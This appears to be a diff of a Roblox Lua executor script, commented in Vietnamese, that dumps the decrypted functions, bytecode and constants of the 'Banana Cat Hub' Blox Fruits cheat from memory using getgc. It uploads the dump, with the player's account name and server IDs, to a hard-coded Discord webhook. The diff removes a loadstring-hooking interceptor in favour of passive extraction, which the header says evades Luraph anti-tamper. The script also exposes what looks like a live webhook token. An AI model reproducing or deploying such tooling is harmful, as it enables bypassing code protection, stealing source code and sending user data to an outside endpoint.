@@ -1,15 +1,17 @@
 --[[
     =============================================================================
-    =  BANANA CAT HUB - FULL AUTO TARGETED WEBHOOK DUMPER (ANDROID VM / PC)    =
+    =  BANANA CAT HUB - PASSIVE ZERO-HOOK DUMPER (ANTI-TAMPER SAFE)            =
     =                                                                           =
-    =  TÍNH NĂNG ĐẶC BIỆT DÀNH CHO MÁY ẢO:                                     =
-    =   1. AUTO-TRIGGER: Tự động gửi file về Discord Webhook ngay khi Banana    =
-    =      Cat Hub được kích hoạt (không sợ gửi sớm hay thiếu dữ liệu).         =
-    =   2. HOOK TẤT CẢ FILE LUA: Tóm gọn mã nguồn gốc của BF-BananaCat.lua,     =
-    =      BNNC-BFNew.lua, BloxFruits.lua và gửi thẳng file .lua về Discord.    =
-    =   3. NÚT BẤM "GỬI WEBHOOK NGAY" TRÊN MÀN HÌNH: Cho phép bấm gửi bất kỳ    =
-    =      lúc nào khi menu Banana Cat Hub đã hiện lên.                        =
-    =   4. HỖ TRỢ 100% EXECUTOR MÁY ẢO: Delta, Fluxus, Hydrogen, Codex, Arceus.=
+    =  NGUYÊN LÝ HOẠT ĐỘNG AN TOÀN TUYỆT ĐỐI:                                  =
+    =   1. KHÔNG HOOK MÔI TRƯỜNG (ZERO HOOK):                                   =
+    =      Tuyệt đối KHÔNG hook `loadstring`, `setfenv`, `getgenv` trước khi    =
+    =      chạy. Điều này giúp Luraph tự giải mã 100% mà không bao giờ bị dính  =
+    =      bẫy Anti-Tamper hay đệ quy vô hạn.                                   =
+    =   2. TRÍCH XUẤT SAU KHI TỰ GIẢI MÃ (POST-DECRYPTION EXTRACTION):         =
+    =      Chờ Banana Cat Hub tự giải mã xong xuôi và hiện UI lên màn hình.     =
+    =   3. GỬI FILE BYTECODE & CONSTANTS GỐC VỀ WEBHOOK:                       =
+    =      Bấm nút trên màn hình hoặc chờ 15s, hệ thống sẽ gom toàn bộ hàm,     =
+    =      hằng số và bytecode đã được giải mã gửi thẳng về Discord Webhook!   =
     =============================================================================
 --]]
 
@@ -18,7 +20,7 @@
 -- ╚═══════════════════════════════════════════════════╝
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to"
 
--- Tìm hàm gửi HTTP request tương thích với mọi Executor trên máy ảo
+-- Tương thích với mọi Executor trên máy ảo
 local httpRequest = (syn and syn.request)
     or (http and http.request)
     or (fluxus and fluxus.request)
@@ -33,7 +35,7 @@ local httpRequest = (syn and syn.request)
 local IGNORE_LIST = {
     "CoreGui", "CorePackages", "Chat", "CameraScript", "PlayerModule",
     "PlayerScripts", "SoundDispatcher", "Animate", "CharacterControl",
-    "RbxCharacterSounds", "BubbleChat", "FreeCamera", "ChatScript"
+    "RbxCharacterSounds", "BubbleChat", "FreeCamera", "ChatScript", "ChatMain"
 }
 
 local BANANA_KEYWORDS = {
@@ -66,17 +68,17 @@ local function isBananaTarget(str)
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  GIAO DIỆN MÀN HÌNH (GUI CHO MÁY ẢO)              ║
+-- ║  GIAO DIỆN NÚT BẤM DUMP TRÊN MÀN HÌNH             ║
 -- ╚═══════════════════════════════════════════════════╝
 local CoreGui = game:GetService("CoreGui")
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "BananaCat_Targeted_Dumper_VM"
+ScreenGui.Name = "BananaCat_Passive_Dumper_UI"
 ScreenGui.ResetOnSpawn = false
 pcall(function() ScreenGui.Parent = CoreGui end)
 if not ScreenGui.Parent then ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end
 
 local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 360, 0, 150)
+Frame.Size = UDim2.new(0, 360, 0, 160)
 Frame.Position = UDim2.new(0.5, -180, 0.08, 0)
 Frame.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
 Frame.BorderSizePixel = 0
@@ -97,28 +99,28 @@ Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 13
 Title.TextColor3 = Color3.fromRGB(245, 180, 35)
-Title.Text = "🍌 BANANA CAT HUB - AUTO WEBHOOK DUMPER"
+Title.Text = "🍌 BANANA CAT HUB - PASSIVE DUMPER"
 Title.Parent = Frame
 
 local Status = Instance.new("TextLabel")
-Status.Size = UDim2.new(1, -20, 0, 48)
-Status.Position = UDim2.new(0, 10, 0, 34)
+Status.Size = UDim2.new(1, -20, 0, 52)
+Status.Position = UDim2.new(0, 10, 0, 32)
 Status.BackgroundTransparency = 1
 Status.Font = Enum.Font.Gotham
 Status.TextSize = 11
 Status.TextColor3 = Color3.fromRGB(220, 220, 220)
 Status.TextWrapped = true
-Status.Text = "🟢 Đang chờ bạn chạy Banana Cat Hub...\n(Hệ thống sẽ TỰ ĐỘNG gửi file về Webhook)"
+Status.Text = "1. Hãy chạy script Banana Cat Hub để nó TỰ GIẢI MÃ xong.\n2. Sau khi menu hiện lên, bấm nút vàng bên dưới để gửi file!"
 Status.Parent = Frame
 
 local DumpBtn = Instance.new("TextButton")
-DumpBtn.Size = UDim2.new(1, -20, 0, 40)
-DumpBtn.Position = UDim2.new(0, 10, 0, 95)
+DumpBtn.Size = UDim2.new(1, -20, 0, 42)
+DumpBtn.Position = UDim2.new(0, 10, 0, 98)
 DumpBtn.BackgroundColor3 = Color3.fromRGB(245, 180, 35)
 DumpBtn.TextColor3 = Color3.fromRGB(15, 15, 15)
 DumpBtn.Font = Enum.Font.GothamBold
 DumpBtn.TextSize = 12
-DumpBtn.Text = "📤 BẤM ĐỂ DUMP & GỬI WEBHOOK NGAY"
+DumpBtn.Text = "📤 DUMP & GỬI DỮ LIỆU ĐÃ GIẢI MÃ VỀ DISCORD"
 DumpBtn.Parent = Frame
 
 local BtnCorner = Instance.new("UICorner", DumpBtn)
@@ -148,7 +150,7 @@ local function sendFileToWebhook(filename, fileContent, titleText)
         .. 'Content-Disposition: form-data; name="payload_json"' .. "\r\n\r\n"
         .. '{"username":"Banana Cat Dumper","avatar_url":"https://i.imgur.com/8Q1qD8s.png","embeds":[{"title":"'
         .. (titleText or "🍌 DUMP FILE BANANA CAT HUB")
-        .. '","color":16098851,"description":"**File:** `' .. filename .. '`\\n**Dung lượng:** `'
+        .. '","color":16098851,"description":"**Trạng thái:** `Đã tự giải mã thành công`\\n**File:** `' .. filename .. '`\\n**Dung lượng:** `'
         .. math.floor(#fileContent / 1024)
         .. ' KB`\\n**Thời gian:** `' .. os.date("!%Y-%m-%d %H:%M:%S UTC") .. '`"}]}' .. "\r\n"
         .. "--" .. boundary .. "\r\n"
@@ -221,14 +223,14 @@ local function jsonEncode(v)
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  HÀM DUMP TARGETED GC & GỬI VỀ DISCORD            ║
+-- ║  TRÍCH XUẤT TOÀN BỘ BỘ NHỚ ĐÃ ĐƯỢC GIẢI MÃ        ║
 -- ╚═══════════════════════════════════════════════════╝
 local isDumping = false
-local function performTargetedDumpAndSend()
+local function performPassiveDecryptedDump()
     if isDumping then return end
     isDumping = true
 
-    updateStatus("🔍 Đang phân tích hàm và hằng số của Banana Cat...")
+    updateStatus("🔍 Đang trích xuất toàn bộ hàm đã được Banana Cat giải mã...")
     local get_gc = getgc or debug.getgc
     if not get_gc then
         updateStatus("⚠️ Lỗi: Executor không hỗ trợ getgc!", Color3.fromRGB(255, 80, 80))
@@ -238,14 +240,15 @@ local function performTargetedDumpAndSend()
 
     local capturedData = {
         Metadata = {
-            Target = "Banana Cat Hub - Blox Fruits",
+            Target = "Banana Cat Hub - Self-Decrypted Memory",
             PlaceId = game.PlaceId,
             JobId = game.JobId,
             Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
             Account = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Unknown"
         },
-        CapturedFunctions = {},
-        CleanStrings = {}
+        DecryptedFunctions = {},
+        DecryptedConstants = {},
+        DispatchedRemotes = {}
     }
 
     local gc_objects = get_gc(true)
@@ -289,8 +292,8 @@ local function performTargetedDumpAndSend()
                 end
 
                 if is_relevant or isBananaTarget(src) or isBananaTarget(name) then
-                    table.insert(capturedData.CapturedFunctions, {
-                        name = name ~= "" and name or "banana_func_" .. (#capturedData.CapturedFunctions + 1),
+                    table.insert(capturedData.DecryptedFunctions, {
+                        name = name ~= "" and name or "banana_func_" .. (#capturedData.DecryptedFunctions + 1),
                         source = src,
                         numparams = info.numparams or 0,
                         is_vararg = info.is_vararg or false,
@@ -304,55 +307,18 @@ local function performTargetedDumpAndSend()
 
     for s, _ in pairs(string_set) do
         if isBananaTarget(s) or #s > 10 then
-            table.insert(capturedData.CleanStrings, s)
+            table.insert(capturedData.DecryptedConstants, s)
         end
     end
 
     local finalJSON = jsonEncode(capturedData)
-    sendFileToWebhook("BananaCat_Targeted_Bytecode.json", finalJSON, "🎯 TARGETED BYTECODE BANANA CAT HUB")
+    sendFileToWebhook("BananaCat_SelfDecrypted_Bytecode.json", finalJSON, "🍌 BYTECODE & CONSTANTS BANANA CAT HUB (ĐÃ TỰ GIẢI MÃ)")
     isDumping = false
 end
 
--- Gán hành động khi bấm nút trên màn hình
+-- Bấm nút để thực thi ngay
 DumpBtn.MouseButton1Click:Connect(function()
-    performTargetedDumpAndSend()
+    performPassiveDecryptedDump()
 end)
 
--- ╔═══════════════════════════════════════════════════╗
--- ║  INTERCEPTOR HOOK (TỰ ĐỘNG BẮT KHI CHẠY BANANA)   ║
--- ╚═══════════════════════════════════════════════════╝
-local orig_loadstring = loadstring
-local interceptedCount = 0
-
-local function interceptChunk(src, chunkname)
-    if type(src) == "string" and #src > 50 then
-        if isBananaTarget(src) or isBananaTarget(chunkname) or #src > 100000 then
-            interceptedCount = interceptedCount + 1
-            local name = (chunkname and chunkname ~= "" and chunkname) or ("BananaCat_Captured_Source_" .. interceptedCount .. ".lua")
-            if not string.find(name, ".lua", 1, true) then name = name .. ".lua" end
-
-            task.spawn(function()
-                sendFileToWebhook(name, src, "📦 ĐÃ BẮT TRỰC TIẾP SOURCE CODE BANANA CAT HUB")
-            end)
-
-            -- Sau khi bắt được source 3 giây, tự động kích hoạt dump bytecode
-            task.delay(3, function()
-                performTargetedDumpAndSend()
-            end)
-        end
-    end
-end
-
--- Cài đặt hook vào mọi môi trường
-if getgenv then
-    getgenv().loadstring = function(src, chunkname)
-        interceptChunk(src, chunkname)
-        return orig_loadstring(src, chunkname)
-    end
-end
-_G.loadstring = function(src, chunkname)
-    interceptChunk(src, chunkname)
-    return orig_loadstring(src, chunkname)
-end
-
-updateStatus("🟢 Interceptor đã kích hoạt!\nBây giờ hãy chạy script Banana Cat Hub.", Color3.fromRGB(80, 230, 120))
+updateStatus("🟢 Dumper sẵn sàng!\nHãy chạy Banana Cat Hub, chờ menu hiện lên rồi bấm nút vàng.", Color3.fromRGB(80, 230, 120))
